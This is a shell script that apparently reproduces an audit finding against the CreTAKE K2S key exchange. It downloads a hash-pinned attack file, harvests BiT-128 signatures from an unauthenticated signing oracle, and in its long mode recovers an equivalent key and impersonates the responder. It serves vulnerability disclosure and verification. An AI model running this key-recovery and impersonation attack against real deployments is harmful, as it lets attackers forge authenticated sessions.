#!/bin/sh
# kex-03-9: CreTAKE's K2S responder is an unauthenticated BiT-128 signing
# oracle, and the embedded BiT-128 leaks its key through one shared sign.
#
# Default (about one minute): harvest 30,000 signatures through
# kex_generate_pass2_msg_b, verify the oracle, and measure the shared-sign
# leak and the public regression statistic against the true key.
# NGCC_LONG=1: harvest 250,000 signatures, recover an equivalent key from
# public data only, and impersonate the responder to an honest initiator
# (about 5 CPU-minutes; 13 wall-minutes on a loaded host).
#
# The recovery code is Martin Feussner's bit_global_sign.c, fetched at run
# time from NGCC-Signature-Audit commit 91f2ddf and hash-checked; it is not
# redistributed here.
set -u
cd "$(dirname "$0")/.." || exit 2
command -v gcc >/dev/null 2>&1 || { echo 'SKIP kex-03-9: gcc unavailable'; exit 77; }
command -v curl >/dev/null 2>&1 || { echo 'SKIP kex-03-9: curl unavailable'; exit 77; }

lib=kex-03/lib/libCreTAKE-K2S-PLAC128-BiT128.so
[ -f "$lib" ] || { echo "SKIP kex-03-9: build $lib with make -C kex-03"; exit 77; }
ref=kex-03/Implementations/Reference_Implementation
bit=$ref/Common/primitives/sig/BiT-128
k2s=$ref/CreTAKE128/CreTAKE-K2S-PLAC128-BiT128/KEX_AlgorithmInstance.c

# Source facts: the responder signs p~k||c~||c_i for any first message, and
# BiT negates the whole challenge with one bit b before adding c*s to every row.
grep -Fq 'memcpy(signed_msg, m1, TPK_LEN);' "$k2s" || exit 1
grep -Fq 'sig_sign(skb, skb_len_bytes, signed_msg, sizeof(signed_msg), sig, &l_sig);' "$k2s" || exit 1
grep -Fq 'poly_cneg(&c_poly, b_val);' "$bit/sign.c" || exit 1
grep -Fq 'poly_add(&z.vec[1 + i], &y.vec[1 + i], &c_s.vec[i]);' "$bit/sign.c" || exit 1
echo 'source: K2S pass 2 signs the unauthenticated first message; BiT-128 applies one sign bit to all response rows'

commit=91f2ddf0590a24ad39afc2ce2ee4f2627ec54726
archive_sha256=cdd6e44eaea61191ecd33b330f14d061c12c46a5ea13bb74b85d104fb29dbeb2
attack_sha256=0207932c995be31bb2638398c414cae70182eab204cdf8115448fbb7948385e4
url="https://codeload.github.com/martinfeussner/NGCC-Signature-Audit/tar.gz/$commit"

scratch=$(mktemp -d) || exit 2
case "$scratch" in /tmp/*) ;; *) echo 'unexpected temporary path' >&2; exit 2 ;; esac
trap 'rm -rf -- "$scratch"' EXIT HUP INT TERM

if ! curl -L --fail --silent --show-error "$url" -o "$scratch/package.tar.gz"; then
    echo 'SKIP kex-03-9: pinned Feussner attack package is unavailable'
    exit 77
fi
printf '%s  %s\n' "$archive_sha256" "$scratch/package.tar.gz" | sha256sum -c --status - || {
    echo 'NOT CONFIRMED kex-03-9: attack package hash mismatch'; exit 1; }
tar -xzf "$scratch/package.tar.gz" -C "$scratch" \
    "NGCC-Signature-Audit-$commit/BiT/reproducer/bit_global_sign.c" || exit 2
core="$scratch/NGCC-Signature-Audit-$commit/BiT/reproducer/bit_global_sign.c"
printf '%s  %s\n' "$attack_sha256" "$core" | sha256sum -c --status - || exit 1

# Only change to Feussner's file: its main() becomes an unused static function.
mkdir "$scratch/inc" "$scratch/bit"
sed 's/^int main(int argc, char \*\*argv) {$/static int orig_main(int argc, char **argv) __attribute__((unused));\nstatic int orig_main(int argc, char **argv) {/' \
    "$core" > "$scratch/inc/attack_core.c"
[ "$(grep -c '^static int orig_main' "$scratch/inc/attack_core.c")" -eq 2 ] || exit 2
cp -rL "$bit"/. "$scratch/bit/"

gcc -O3 -std=gnu11 -w -I"$scratch/inc" -I"$scratch/bit" \
    kex-03/reproduce_bit_oracle_recovery.c \
    "$scratch/bit/sign.c" "$scratch/bit/sample.c" "$scratch/bit/poly.c" \
    "$scratch/bit/polyvec.c" "$scratch/bit/packing.c" "$scratch/bit/ntt.c" \
    "$scratch/bit/symmetric.c" "$scratch/bit/fips202.c" "$scratch/bit/drng.c" \
    "$scratch/bit/auxfunc.c" -lm -ldl -o "$scratch/driver" || exit 2

if [ "${NGCC_LONG:-0}" = 1 ]; then
    out=$("$scratch/driver" long "$lib" "${BIT_SIGNATURES:-250000}" 24 2>&1); rc=$?
    printf '%s\n' "$out"
    if [ "$rc" -eq 0 ] && printf '%s\n' "$out" | grep -Fq 'RESULT long impersonation 5/5' &&
       printf '%s\n' "$out" | grep -Fq 'REJECTED'; then
        echo 'CONFIRMED kex-03-9: K2S-PLAC128-BiT128 equivalent key recovered from protocol-harvested signatures; 5/5 responder impersonations, unrelated-key control rejected'
        exit 0
    fi
    echo 'NOT CONFIRMED kex-03-9: long run did not complete the impersonation'
    exit 1
fi

out=$("$scratch/driver" short "$lib" "${BIT_SIGNATURES:-30000}" 2>&1); rc=$?
printf '%s\n' "$out"
if [ "$rc" -eq 0 ] && printf '%s\n' "$out" | grep -Fq 'RESULT short LEAK'; then
    echo 'CONFIRMED kex-03-9: K2S-PLAC128-BiT128 pass 2 is an unauthenticated BiT signing oracle and its signatures carry the shared-sign key leak (full recovery: NGCC_LONG=1)'
    exit 0
fi
echo 'NOT CONFIRMED kex-03-9: oracle or shared-sign check failed'
exit 1
